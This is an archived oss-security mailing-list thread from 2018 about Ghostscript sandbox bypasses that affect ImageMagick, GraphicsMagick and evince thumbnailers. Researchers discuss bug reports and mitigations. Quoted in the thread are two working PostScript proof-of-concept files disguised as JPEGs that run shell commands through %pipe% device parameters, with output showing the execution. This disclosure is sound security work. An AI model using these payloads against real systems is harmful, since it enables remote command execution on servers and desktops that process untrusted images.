X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["5460" "Wednesday" "22" "August" "2018" "18:57:06" "-0700" "Tavis Ormandy" "taviso@google.com" "<CAJ_zFkL-GFzhRbovmoi2y0LSm_o_fODk6YuMkogWC=AR7EMN0w@mail.gmail.com>" "158" "Re: [oss-security] Re: More Ghostscript Issues: Should we disable PS coders in policy.xml by default?" "^Date:" nil nil "8" "2018082301:57:06" "[oss-security] Re: More Ghostscript Issues: Should we disable PS coders in policy.xml by default?" (number mark "        taviso@googl Aug 22  158/5460  " thread-indent "\"Re: [oss-security] Re: More Ghostscript Issues: Should we disable PS coders in policy.xml by default?\"\n") "<CAJ_zFkJ-qq_SRuiif-mUZmURpTgHrmwx0cp_gM3ms_-TwNVODQ@mail.gmail.com>" ("<CAJ_zFk+ZNi8r8TKTZuaYgSBUz4mxCO7C5SC=B8Ktc_CZQW6Dsw@mail.gmail.com>" "<CAJ_zFk+RtYrqWQ4Mj1SLVJ7BTZBHLjo_M9t-gDVS_uDEPhuCrg@mail.gmail.com>" "<alpine.GSO.2.20.1808210951110.18862@scrappy.simplesystems.org>" "<CAFRnB2U+QMGmAMoZqbCgTjEx_o_NA+Y9eBE6eDBgJJ0hZdQ4GQ@mail.gmail.com>" "<CAJ_zFkJpnGtG6D3JZVaC5KJiNzsJ6vjJK0oXRfirR8QsdFbZVQ@mail.gmail.com>" "<CAOVKCF0Qehz2q3m2vPSAr3vKRAxdHrTbnyk71ApFYnVXuZ-P6Q@mail.gmail.com>" "<CAJ_zFkJ-qq_SRuiif-mUZmURpTgHrmwx0cp_gM3ms_-TwNVODQ@mail.gmail.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 19894 invoked by uid 550); 23 Aug 2018 01:57:31 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 19876 invoked from network); 23 Aug 2018 01:57:30 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=google.com; s=20161025;
        h=mime-version:references:in-reply-to:from:date:message-id:subject:to;
        bh=w+pXjJ7VC3ukOILbli5QKpzdRyNCo3826Lenon8N4aQ=;
        b=NPbs1AnoTXD7sBv90sVWaW/lFFQwO5Q7Uoia1EqtDZIIRS7gd+joiuYFNGNQe5Ztn7
         IZ/fvqpXqSLEQ2aEVknxi2y26l+5mMRxL6JqA9eUcTajGL8jEis4M0pYV3rWVtbclEFt
         0FImWgRDSusGxXprQRZWB7qJDcPXwOZ8JbjXzXu743EQci5AAR4hYuJbxDQhd7wgkcG7
         jw5HEuvyXxvOtRWhJ12k8VLCNg8HFVlDrMxAVs4IY+dxNK83boJnknpsI6nRGaaZWszS
         8Bv74yer0I7NfCjn3+4sN3i4RZLshYqlRBPEKaDOEW9rylNRP5b/yR7lkjVmJm2OVfHN
         lkqA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:mime-version:references:in-reply-to:from:date
         :message-id:subject:to;
        bh=w+pXjJ7VC3ukOILbli5QKpzdRyNCo3826Lenon8N4aQ=;
        b=HQ/ow2z/XeWIaycHkjThn28KeEvj6PC9pjPOMo+NhnlDmRit2+3E6p0r1vzewRenJz
         p/BCGw0wT8tWgJCuK3JanQTsxW6QvfhNwsblNkNrNHVl8S1If61ekWMsjdHKUO3xp6pD
         TCxTZTIFm3InXKN+QaA46BbR8zdDVS3ymLpGp8uTq3Bx1VXkw35qU2MeFavO/OtObV6a
         Y7pUFUhwRZH0L8YIsUegnxsS0dpKiXucyv/ginHrTbCCrizN7A2snDiQDh0mEY6P0FYE
         gfVXDizir5MSJh9bi1O4nili0PNrHt9676Ks9i3R6XaKLECr7N+ydGsqr/d+v8JwLg+m
         EJaw==
X-Gm-Message-State: APzg51A+4ZG17a6/6HrnbS54xu9BrPGveZhVUzq54sJUwA7RD8NUvdz8
	zSlklqmyUGE0RJKYDbyM9/RUQzLBa//yqUbkATBHA8wR
X-Google-Smtp-Source: ANB0Vdbgw0mlkb+lIBxrp6qzMI08x1jdQIEpep3fHkOMippq6slmyEigRfkuYpIz72fVwaFHHhYXq4jQes0da8HQcjI=
X-Received: by 2002:aed:3ca3:: with SMTP id d32-v6mr5539279qtf.5.1534989438263;
 Wed, 22 Aug 2018 18:57:18 -0700 (PDT)
MIME-Version: 1.0
References: <CAJ_zFk+ZNi8r8TKTZuaYgSBUz4mxCO7C5SC=B8Ktc_CZQW6Dsw@mail.gmail.com>
 <CAJ_zFk+RtYrqWQ4Mj1SLVJ7BTZBHLjo_M9t-gDVS_uDEPhuCrg@mail.gmail.com>
 <alpine.GSO.2.20.1808210951110.18862@scrappy.simplesystems.org>
 <CAFRnB2U+QMGmAMoZqbCgTjEx_o_NA+Y9eBE6eDBgJJ0hZdQ4GQ@mail.gmail.com>
 <CAJ_zFkJpnGtG6D3JZVaC5KJiNzsJ6vjJK0oXRfirR8QsdFbZVQ@mail.gmail.com>
 <CAOVKCF0Qehz2q3m2vPSAr3vKRAxdHrTbnyk71ApFYnVXuZ-P6Q@mail.gmail.com> <CAJ_zFkJ-qq_SRuiif-mUZmURpTgHrmwx0cp_gM3ms_-TwNVODQ@mail.gmail.com>
In-Reply-To: <CAJ_zFkJ-qq_SRuiif-mUZmURpTgHrmwx0cp_gM3ms_-TwNVODQ@mail.gmail.com>
Message-ID: <CAJ_zFkL-GFzhRbovmoi2y0LSm_o_fODk6YuMkogWC=AR7EMN0w@mail.gmail.com>
Content-Type: multipart/alternative; boundary="00000000000034012c0574109433"
Date: Wed, 22 Aug 2018 18:57:06 -0700
From: Tavis Ormandy <taviso@google.com>
Reply-To: oss-security@lists.openwall.com
Subject: Re: [oss-security] Re: More Ghostscript Issues: Should we disable PS
 coders in policy.xml by default?
To: oss-security@lists.openwall.com

--00000000000034012c0574109433
Content-Type: text/plain; charset="UTF-8"

FWIW, I just pinged a contact to check that bug.

Putting the two ICC components together like that is clever, I knew about
the two bugs independently but it hadn't clicked they could be chained
together. Nice.

On Wed, Aug 22, 2018, 5:35 PM Tavis Ormandy <taviso@google.com> wrote:

> Thanks Amit, that's scary, it looks like they're working on it right now.
>
> FWIW, I figured out how to reproduce the original bug here in
> evince-thumbnailer:
>
> $ cat test.jpeg
> %!PS
> a0
> { null restore } stopped { pop } if
> (ppmraw) selectdevice
> legal
> mark /OutputFile (%pipe%id) currentdevice putdeviceprops
> showpage
> $ strace -q -feexecve evince-thumbnailer  test.jpeg foo.out
> execve("/usr/bin/evince-thumbnailer", ["evince-thumbnailer", "test.jpeg",
> "foo.out"], 0x7ffeed3010d0 /* 65 vars */) = 0
> execve("/bin/sh", ["sh", "-c", "id"], 0x7ffcf3ea8d18 /* 65 vars */) = 0
>
> Tavis.
>
> On Wed, Aug 22, 2018 at 12:30 PM AmitB <me@amitbl.com> wrote:
>
>> I also took a look a copule weeks ago at few of the patches for your
>> previous bugs from 2 years ago, and found that one of them is incomplete
>> and still allowing RCE (
>> https://bugs.ghostscript.com/show_bug.cgi?id=697178)
>>
>> POC:
>> ------------------
>> $ cat poc.jpg
>> %!PS
>> << (ICCProfilesDir) (%pipe%id > /dev/) >> .setuserparams
>> currentdevice null true mark /OutputICCProfile (tty)
>> .putdeviceparams
>> showpage
>> $ identify poc.jpg
>> uid=1000(amit) gid=1000(amit) groups=1000(amit)
>>
>> After reviewing all of the comments in the original bug report I saw that
>> you actually mentioned this issue, but it was not taken under
>> consideration/forgotten for some reason.
>> So effectively a public RCE PoC has been avaliable for GhostScript for
>> almost 2 years.
>>
>> I opened a report two weeks ago at bugs.ghostscript.com:
>> 699623 Incomplete fix for #697178 Allowing -dSAFER bypass
>>
>> But I got no response from them until today.
>> If you have others channels of contact with them please let them know
>> about
>> this one too.
>>
>> On Tue, Aug 21, 2018 at 11:12 PM, Tavis Ormandy <taviso@google.com>
>> wrote:
>>
>> > Thanks Alex.
>> >
>> > FWIW, not all of these are visible, but I've started filing bugs, I'll
>> file
>> > a few more today and then let the developers work through the most
>> serious
>> > ones.
>> >
>> > 699654 /invalidaccess checks stop working after a failed restore
>> > 699655 missing type checking in setcolor
>> > 699656 LockDistillerParams boolean missing type checks
>> > 699659 missing type check in type checker (!)
>> > 699657 .tempfile SAFER restrictions seem to be broken
>> > 699658 Bypassing PermitFileReading by handling undefinedfilename error
>> > 699660 shading_param incomplete type checking
>> > 699661 pdf14 garbage collection memory corruption
>> > 699662 calling .bindnow causes sideeffects
>> > 699663 .setdistillerkeys memory corruption
>> > 699664 corrupt device object after error in job
>> >
>> > I'm working on getting reproducers working for the developers for all
>> bugs.
>> >
>> > On Tue, Aug 21, 2018 at 8:22 AM Alex Gaynor <alex.gaynor@gmail.com>
>> wrote:
>> >
>> > > A small note. Both ImageMagick and GraphicsMagick process various file
>> > > formats that can nest a different image file inside of them. These are
>> > very
>> > > frequently implemented with a call to ReadImage(), with no checking
>> that
>> > > it's the expected file format. (As a result, the fuzzer finds various
>> > > impressive chains, with sometimes 3 different image formats nested
>> inside
>> > > of each other).
>> > >
>> > > The conclusion of this is that people _must not_ attempt to do their
>> own
>> > > format detection and then pass the data to IM/GM, because this can be
>> > > bypassed with nested formats. It's imperative that GS truly be
>> disabled
>> > > with either policy.xml or by uninstall GS.
>> > >
>> > > Alex
>> > >
>> > > On Tue, Aug 21, 2018 at 11:01 AM Bob Friesenhahn <
>> > > bfriesen@simple.dallas.tx.us> wrote:
>> > >
>> > > > On Tue, 21 Aug 2018, Tavis Ormandy wrote:
>> > > > >
>> > > > > I think those thumbnails should be disabled, but you've probably
>> > > noticed
>> > > > I
>> > > > > think everything related to untrusted ghostscript should be
>> disabled
>> > > :-)
>> > > >
>> > > > I have posted to the GraphicsMagick Announcements mailing list
>> > > > regarding your findings (with a link to this list) and suggested
>> that
>> > > > a fool-proof solution is that Ghostscript should be uninstalled.
>> > > >
>> > > > Uninstalling Ghostscript entirely might cause software using libgs
>> to
>> > > > not execute at all unless a stub library is put in its place.
>> > > >
>> > > > Dependencies on Ghostscript are much larger than one would initially
>> > > > think due to Postscript being the traditional output from Unix
>> > > > software for "printing" and thus it is used as an intermediate
>> format
>> > > > in order to convert between formats.  EPS content is also embedded
>> in
>> > > > some other formats.
>> > > >
>> > > > Bob
>> > > > --
>> > > > Bob Friesenhahn
>> > > > bfriesen@simple.dallas.tx.us,
>> > > http://www.simplesystems.org/users/bfriesen/
>> > > > GraphicsMagick Maintainer,    http://www.GraphicsMagick.org/
>> > > >
>> > >
>> > >
>> > > --
>> > > All that is necessary for evil to succeed is for good people to do
>> > nothing.
>> > >
>> >
>>
>

--00000000000034012c0574109433--
